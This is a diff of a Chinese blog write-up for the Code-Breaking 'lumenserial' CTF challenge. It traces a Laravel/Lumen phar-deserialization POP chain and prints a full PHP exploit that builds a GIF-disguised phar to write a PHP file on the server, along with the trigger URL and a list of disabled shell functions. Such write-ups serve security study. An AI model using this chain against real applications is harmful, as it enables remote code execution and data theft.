@@ -114,52 +114,134 @@
 <p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
 <h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
 <p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function download($url)</span><br><span class="line">&#123;</span><br><span class="line">    $content = file_get_contents($url);</span><br></pre></td></tr></table></figure>
-
-<p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>
-
-<h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
+<pre><code>private function download($url)
+{
+    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
+<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
 <p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class PendingBroadcast</span><br><span class="line">&#123;   </span><br><span class="line">public function __construct(Dispatcher $events, $event)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;event = $event;</span><br><span class="line">    $this-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
+<pre><code>class PendingBroadcast
+{   
+public function __construct(Dispatcher $events, $event)
+{
+    $this-&gt;event = $event;
+    $this-&gt;events = $events;
+}
+public function __destruct()
+    {
+        $this-&gt;events-&gt;dispatch($this-&gt;event);
+    }
+}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
 <p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
 <p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
-<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    $i = 0;</span><br><span class="line">    do &#123;</span><br><span class="line">        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">        $i++;</span><br><span class="line">        if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">            throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">    return $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments)
+{
+    $i = 0;
+    do {
+        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
+        $i++;
+        if ($i &gt; $this-&gt;maxRetries) {
+            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
+        }
+    } while (!call_user_func($this-&gt;validator, $res));
 
-<p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
+    return $res;
+}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
 <p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
-<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes) </span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>继续跟进format方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
+<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) 
+{
+    return $this-&gt;format($method, $attributes);
+}</code></pre><p>继续跟进format方法</p>
+<pre><code>public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  
+}</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
+<pre><code>public function getFormatter($formatter)
+{
+    if (isset($this-&gt;formatters[$formatter])) {
+        return $this-&gt;formatters[$formatter];
+    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
 <p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
 <p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
 <h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
 <p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
 <p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">namespace PHPUnit\Framework\MockObject\Stub;</span><br><span class="line">class ReturnCallback implements Stub</span><br><span class="line">&#123;</span><br><span class="line">public function invoke(Invocation $invocation)</span><br><span class="line">&#123;</span><br><span class="line">    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
+<pre><code>namespace PHPUnit\Framework\MockObject\Stub;
+class ReturnCallback implements Stub
+{
+public function invoke(Invocation $invocation)
+{
+    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());
+}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
 <p>找到调用这个接口的类就行了，这里是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">namespace PHPUnit\Framework\MockObject\Invocation;</span><br><span class="line">class StaticInvocation implements Invocation, SelfDescribing</span><br><span class="line">&#123;</span><br><span class="line">private $parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
+<pre><code>namespace PHPUnit\Framework\MockObject\Invocation;
+class StaticInvocation implements Invocation, SelfDescribing
+{
+private $parameters;
+}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
 <h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
 <p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
 <h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;events = new \Faker\ValidGenerator();</span><br><span class="line">            $this-&gt;event = &apos;everything&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Invocation&#123;</span><br><span class="line">    class StaticInvocation&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;parameters = array(&apos;/var/www/html/upload/hpdoger.php&apos;,&apos;&lt;?php print_r(file_get_contents(&apos;../../flag_larave1_b0ne&apos;));?&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Stub&#123;</span><br><span class="line">    class ReturnCallback&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;callback = &apos;file_put_contents&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();</span><br><span class="line">            $g1 = new \Faker\Generator(array(&apos;everything&apos; =&gt; $evilobj ));</span><br><span class="line">            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));</span><br><span class="line"></span><br><span class="line">            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line"></span><br><span class="line">            $this-&gt;validator = array($rc, &quot;invoke&quot;);</span><br><span class="line">            $this-&gt;generator = $g2;</span><br><span class="line">            $this-&gt;maxRetries = 10000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        function __construct($form)&#123;</span><br><span class="line">            $this-&gt;formatters = $form;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">    print_r(urlencode(serialize($exp)));</span><br><span class="line"></span><br><span class="line">    // phar</span><br><span class="line">    $p = new Phar(&apos;./hpdoger.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($exp);</span><br><span class="line">    $p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+namespace Illuminate\Broadcasting{
+    class PendingBroadcast{
+        function __construct(){
+            $this-&gt;events = new \Faker\ValidGenerator();
+            $this-&gt;event = &#39;everything&#39;;
+        }
+    }
+}
 
-<p>上传文件，接着进行反序列化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</span><br></pre></td></tr></table></figure>
+namespace PHPUnit\Framework\MockObject\Invocation{
+    class StaticInvocation{
+        function __construct(){
+            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);
+        }
+    }
+}
 
-<p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
+namespace PHPUnit\Framework\MockObject\Stub{
+    class ReturnCallback{
+        function __construct(){
+            $this-&gt;callback = &#39;file_put_contents&#39;;
+        }
+    }
+}
+
+namespace Faker{
+    class ValidGenerator{
+        function __construct(){
+            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
+            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));
+            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));
+
+            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();
+
+            $this-&gt;validator = array($rc, &quot;invoke&quot;);
+            $this-&gt;generator = $g2;
+            $this-&gt;maxRetries = 10000;
+        }
+    }
+
+    class Generator{
+        function __construct($form){
+            $this-&gt;formatters = $form;
+        }
+    }
+
+}
+namespace{
+    $exp = new Illuminate\Broadcasting\PendingBroadcast();
+    print_r(urlencode(serialize($exp)));
+
+    // phar
+    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);
+    $p-&gt;startBuffering();
+    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+    $p-&gt;setMetadata($exp);
+    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);
+    $p-&gt;stopBuffering();
+}</code></pre><p>上传文件，接着进行反序列化</p>
+<pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
 <p>再次膜前辈师傅们</p>
 
             </div>
@@ -167,16 +249,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2019/01/09/Code-breaking-medium֮lumenserial/">https://hpdoger.cn/2019/01/09/Code-breaking-medium֮lumenserial/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -189,7 +271,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
